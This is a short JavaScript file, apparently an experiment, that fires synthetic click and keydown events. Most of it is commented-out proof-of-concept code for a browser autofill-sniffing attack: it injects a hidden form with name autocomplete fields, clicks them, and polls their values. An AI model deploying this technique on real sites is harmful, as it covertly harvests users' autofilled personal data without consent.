// document.getElementById("haha").style.display = "none";

var link = document.getElementById('first');
for(var i = 0; i < 2; i++){
    link.click();
    link.addEventListener("click", function(){
        var e = jQuery.Event("keydown");
        e.which = 50;
        $('#first').trigger(e);
        console.log("trigger");
    });
    console.log("h");
}

console.log("hello");

// var injectForm = function(visible) {
//     console.log("Injecting the form");
//     var container = document.createElement('div');
//     if (!visible){
//       container.style.display = 'block';
//     }
//     var form = document.createElement('form');
//     form.attributes.autocomplete = 'on';
//     var emailInput = document.createElement('input');
//     //emailInput.attributes.vcard_name = 'vCard.FirstName';
//     emailInput.id = 'ssfirstname';
//     emailInput.type = 'text';
//     emailInput.name = 'ssfirstname';
//     emailInput.autocomplete = "given-name";
//     console.log(emailInput);
//     form.appendChild(emailInput);
//     var passwordInput = document.createElement('input');
//     passwordInput.id = 'sslastname';
//     passwordInput.type = 'text';
//     passwordInput.name = 'sslastname';
//     passwordInput.autocomplete = "family-name";
//     form.appendChild(passwordInput);
//     container.appendChild(form);
//     document.body.appendChild(container); 
//     document.getElementById('ssfirstname').click();
//     console.log("dine");
//     document.getElementById('sslastname').click();
//   };
  
//   var printResult = function(elementId, sniffedValue){
//       console.log("idddd", elementId);
//       console.log("value", sniffedValue);
//     document.getElementById("1"+elementId).innerHTML = "<b>" + sniffedValue + "</b>";
//   };
  
//   var sniffInputField = function(fieldId){
//     var inputElement = document.getElementById(fieldId);
//     console.log("aaa", inputElement);
//     if (inputElement.value.length){
//       printResult(fieldId, inputElement.value);
//     }else{
//       window.setTimeout(sniffInputField, 200, fieldId);  // wait for 200ms
//     }
//   };
  
//   var sniffInputFields = function(){  
//     var inputs = document.getElementsByTagName('input');
//     for (var i = 0; i < inputs.length; i++) {
//       console.log("Will try to sniff element with id: " + inputs[i].id);
//       console.log(inputs[i].id);
//       sniffInputField(inputs[i].id);
//     }
//   };
  
//   var sniffFormInfo = function(visible) {
//     document.getElementById('firstname').click();
//     injectForm(visible);
//     sniffInputFields();
//   };
  
//   var visible_form=false;  // will use an invisible form
//   sniffFormInfo(visible_form);


